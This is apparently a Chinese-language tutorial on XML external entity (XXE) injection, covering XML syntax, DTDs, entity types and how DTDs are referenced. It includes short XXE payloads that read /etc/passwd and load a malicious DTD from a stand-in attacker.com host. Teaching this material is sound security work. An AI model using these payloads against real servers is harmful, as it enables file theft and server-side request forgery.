# XXE

XXE：中文名称：XML外部实体注入。

## XXE漏洞原理

**漏洞成因：解析时未对XML外部实体加以限制，导致攻击者将恶意代码注入到XML中，导致服务器加载恶意的外部实体引发文件读取，SSRF，命令执行等危害操作。**

**漏洞本质**：XML解析器太"老实"，完全按照XML文件里的指示做事

这就好比在网购订单里写："商品位置：请到我家床头柜第二个抽屉取货"，而系统真的会照做。

简单了解XML：

XML（**可扩展标记语言**）是一种类似于 HTML 的**标记语言**，但它的核心目的是**存储和传输结构化数据**，而不是像 HTML 那样用于网页显示。

## **XML vs HTML**

| 特性       | XML                                        | HTML                                 |
| ---------- | ------------------------------------------ | ------------------------------------ |
| **用途**   | 存储和传输数据                             | 网页显示                             |
| **标签**   | 自定义（如 `<user>`）                      | 固定（如 `<div>`、`<p>`）            |
| **大小写** | 区分大小写                                 | 不区分                               |
| **解析**   | 必须严格符合语法                           | 浏览器可容忍部分错误                 |
| 比喻       | 就像盒子里放的发票小票，重点是记录准确数据 | 就像包装礼品的盒子，重点是让东西好看 |

✅ **跨平台通用**：
所有编程语言都能解析 XML，适合不同系统之间**传数据**。

## **XML 语法规则**

不像 HTML 有固定的标签（如 `<p>`, `<div>`），XML **允许自定义标签**，

### 1. 所有元素必须有关闭标签

❌ 错误写法（HTML 允许，但 XML 不行）：

```
<book>Harry Potter
```

✅ 正确写法：

```
<book>Harry Potter</book>
```

或者自闭合标签（空元素）：

```
<image src="cover.jpg" />
```

------

### **2. XML 标签对大小写敏感**

❌ 错误写法：

```
<Title>Harry Potter</title>  <!-- 前后大小写不一致 -->
```

✅ 正确写法：

```
<title>Harry Potter</title>
```

------

### **3. XML 必须正确嵌套**

❌ 错误写法（标签交叉）：

```
<book><title>Harry Potter</book></title>
```

✅ 正确写法：

```xml
<book>
    <title>Harry Potter</title>
</book>
```

------

### **4. XML 文档必须有且仅有一个根元素**

❌ 错误写法（多个根元素）：

```
<book>Harry Potter</book>
<author>J.K. Rowling</author>
```

✅ 正确写法（用 `<library>` 作为根元素）：

```
<library>
    <book>Harry Potter</book>
    <author>J.K. Rowling</author>
</library>
```

------

### **5. XML 属性值必须加引号**

❌ 错误写法（无引号）：

```
<book category=fantasy>
```

✅ 正确写法（单引号或双引号均可）：

```
<book category="fantasy">
```

或

```
<book category='fantasy'>
```



## DTD（文档类型定义）

DTD是XML文档的类型定义，它定义了XML文档的结构、元素和属性。在XXE攻击中，攻击者主要利用DTD中的外部实体声明。

- 文档中可以包含哪些元素
- 元素之间如何嵌套
- 元素可以有哪些属性
- 可以定义哪些实体

## 实体

实体是用来定义普通文本的变量。实体引用是对实体的引用。

### 实体的类型

### **（1）内部实体**

```
<!ENTITY 实体名 "实体值">
```

**示例**：

```
<!ENTITY company "Google">
<company>&company;</company>  <!-- 输出：Google -->
```

- **不涉及外部资源访问**，无法读取文件或发起网络请求。
- 即使允许内部实体，只要禁用**外部实体**（`SYSTEM`）仍可防御XXE攻击。

注释: 一个实体由三部分构成: 一个和号 (&), 一个实体名称, 以及一个分号 (;)。

### （2）外部实体（XXE 攻击的关键）

```
<!ENTITY 实体名 SYSTEM "外部资源路径">
```

**示例（恶意XXE）**：

```
<!DOCTYPE hack [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>  <!-- 尝试读取系统文件 -->
```

或（较少用）

```
<!ENTITY 实体名 PUBLIC "公共标识符" "外部资源路径">
```

 **可访问外部资源**（文件、网络、服务等）
 **XXE（XML外部实体注入）攻击的核心载体**
 **默认在部分XML解析器中启用**（需手动关闭防御）

- **任意文件读取**：通过 `file://` 窃取服务器敏感文件。
- **网络探测/SSRF**：通过 `http://` 扫描内网或攻击其他系统。
- **依赖解析器默认配置**：许多旧版XML库默认允许外部实体。

### （3）参数实体（用于DTD内部）

定义参数实体

```
<!ENTITY % 实体名 "实体内容">
```

示例：

```
<!ENTITY % param "恶意内容">
```

引用参数实体

```
%实体名;  <!-- 注意必须带%和分号 -->
```



### **XML 实体引用**

#### **1. 为什么需要实体引用？**

在 XML 中，某些字符（如 `<`, `>`, `&` 等）具有特殊含义，如果直接在文本中使用，解析器会误认为是标签或语法符号，导致错误。
例如：

```
<message>hello < world</message>  <!-- 错误！解析器会把 "<" 当作新标签的开始 -->
```

需要用实体引用代替这些特殊字符：

```
<message>hello &lt; world</message>  <!-- 正确！"&lt;" 表示 "<" -->
```

#### **2. XML 预定义的 5 个实体引用**

| **实体引用** | **对应字符** | **说明**                 |
| ------------ | ------------ | ------------------------ |
| `&lt;`       | `<`          | 小于号                   |
| `&gt;`       | `>`          | 大于号                   |
| `&amp;`      | `&`          | 和号（本身用于实体引用） |
| `&apos;`     | `'`          | 单引号                   |
| `&quot;`     | `"`          | 双引号                   |

#### **3. 使用示例**

- **避免标签冲突**

  ```
  <code>if x &lt; 10 then print("hello")</code>
  ```

  解析后：`if x < 10 then print("hello")`

- **属性值中的引号**

  ```
  <note author='John &apos;Doe&apos;'/>
  ```

  等效于：`author='John 'Doe''`

- **特殊字符组合**

  ```
  <example>&amp;amp;</example>  <!-- 表示 "&amp;" -->
  ```

------

#### **4. 注意事项**

1. **& 必须转义**
   因为它是实体引用的起始符，直接使用会报错：

   ```
   <company>AT&T</company>  <!-- 错误！ -->
   <company>AT&amp;T</company>  <!-- 正确！ -->
   ```

2. **CDATA 区段**
   如果内容包含大量特殊字符，可用 `<![CDATA[ ]]>` 包裹，避免逐个转义：

   ```
   <script><![CDATA[if (x < 10 && y > 20) { alert("hello"); }]]></script>
   ```

3. **自定义实体（DTD 中定义）**
   除了预定义的 5 个实体，还可以在 DTD 中自定义实体（但可能存在 XXE 安全风险）：

   ```
   <!DOCTYPE foo [ <!ENTITY myname "Alice"> ]>
   <user>&myname;</user>
   ```

   ​

### DTD的引用方式

#### 一、内部DTD（内联DTD）

**定义**：直接嵌入在XML文档内部的DTD

**语法**：

```
<!DOCTYPE 根元素名 [
  <!ENTITY 实体名 "实体值">
  <!-- 其他声明 -->
]>
```

**示例**：

```
<!DOCTYPE note [
  <!ENTITY author "John Doe">
  <!ENTITY company "ACME Inc">
]>
<note>
  <from>&author;</from>
  <company>&company;</company>
</note>
```

**特点**：

- 直接写在XML文档内部
- 适用于简单的实体定义
- XXE攻击中常用于直接文件读取

#### 二、外部DTD引用

##### 1. 系统标识符引用

**语法**：

```
<!DOCTYPE 根元素名 SYSTEM "DTD文件URI">
```

**示例**：

```
<!DOCTYPE data SYSTEM "http://attacker.com/malicious.dtd">
<data>&xxe;</data>
```

##### 2. 公共标识符引用（较少使用）

**语法**：

```
<!DOCTYPE 根元素名 PUBLIC "公共标识符" "DTD文件URI">
```

**示例**：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
```

- **特点**：
  - 从外部文件加载DTD定义
  - XXE中常用于：
    - 远程加载恶意DTD
    - 绕过长度限制
    - 实现盲XXE（无回显攻击）

#### 三、混合引用方式

**语法**：

```
<!DOCTYPE 根元素名 SYSTEM "外部DTD URI" [
   <!-- 内部补充声明 -->
]>
```

**示例**：

```
<!DOCTYPE note SYSTEM "http://example.com/partial.dtd" [
  <!ENTITY secret "Confidential">
]>
<note>&secret;</note>
```

**特点**：

- 同时使用外部和内部DTD

## 对比表

| 引用方式     | 优点     | 缺点          | 典型XXE用途  |
| ------------ | -------- | ------------- | ------------ |
| **内部DTD**  | 简单直接 | 受XML长度限制 | 直接文件读取 |
| **外部DTD**  | 灵活强大 | 需要外连权限  | 盲XXE攻击    |
| **混合引用** | 功能全面 | 结构复杂      | 参数实体攻击 |

#### DTD元素

声明一个元素

（1）声明一个元素
<!ELEMENT 元素名称 类别>
或者
<!ELEMENT 元素名称 (元素内容)>
（2）空元素
<!ELEMENT 元素名称 EMPTY>
（3）只有 PCDATA 的元素
<!ELEMENT 元素名称 (#PCDATA)>
（4）带有任何内容的元素
<!ELEMENT 元素名称 ANY>
（5）带有子元素的元素
<!ELEMENT 元素名称 (子元素名称1,子元素名称2,.....)>
（6）声明只出现一次的元素
<!ELEMENT 元素名称 (子元素名称)>
（7）声明最少出现一次的元素
<!ELEMENT 元素名称 (子元素名称+)>
（8）声明出现零次或多次的元素
<!ELEMENT 元素名称 (子元素名称+)>
（9）声明出现零次或多次的元素
<!ELEMENT 元素名称 (子元素名称*)>
（10）声明出现零次或一次的元素
<!ELEMENT 元素名称 (子元素名称?)>
（11）声明“非.../既...”类型的内容
<!ELEMENT note (to,from,header,(message|body))>
（12）声明混合型的内容
<!ELEMENT note (#PCDATA|to|from|header|message)*>

DTD属性
（1）声明属性

<!ATTLIST 元素名称 属性名称 属性类型 默认值>
DTD 实例:
<!ATTLIST payment type CDATA "check">
XML 实例:
<payment type="check" />
（2）列举属性值

<!ATTLIST 元素名称 属性名称 (en1|en2|..) 默认值>
DTD 例子:
<!ATTLIST payment type (check|cash) "cash">
XML 例子:
<payment type= "check" />
或者
<payment type="cash" />

